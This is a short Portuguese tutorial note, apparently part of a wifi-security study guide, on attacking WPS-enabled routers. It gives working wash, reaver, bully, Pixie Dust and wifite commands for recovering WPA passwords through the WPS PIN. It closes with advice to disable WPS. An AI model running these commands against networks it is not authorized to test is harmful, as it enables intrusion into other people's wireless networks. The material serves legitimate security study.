# 06 — Ataques ao WPS

[[00-INDICE|⬅ Voltar ao índice]]

**WPS** (aquele botão / PIN de 8 dígitos para conectar fácil) é um ponto fraco histórico. Se estiver ativo e vulnerável, dá pra recuperar a senha WPA sem dicionário.

## Descobrir APs com WPS ativo

```bash
sudo wash -i wlan0mon
```

Coluna **Lck** = `No` significa WPS não travado (potencialmente atacável).

## Reaver (ataque ao PIN)

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -c 6 -vv
```

- O PIN tem 8 dígitos, mas a falha de projeto reduz o espaço de busca drasticamente.
- Pode levar horas; muitos roteadores hoje têm **rate-limiting / lockout**.

## Bully (alternativa ao reaver)

```bash
sudo bully wlan0mon -b AA:BB:CC:11:22:33 -c 6
```

## Pixie Dust (rápido, se vulnerável)

Alguns chipsets têm geração fraca de números aleatórios — dá pra quebrar offline em segundos/minutos:

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -c 6 -K 1 -vv
```

> [!tip] Ferramenta que automatiza tudo
> O **wifite** junta scan + handshake + WPS + PMKID numa interface só:
> ```bash
> sudo wifite
> ```

> [!warning] Defesa
> Conclusão prática: **desligue o WPS** no roteador. É a recomendação nº 1 de [[09-defesa]].
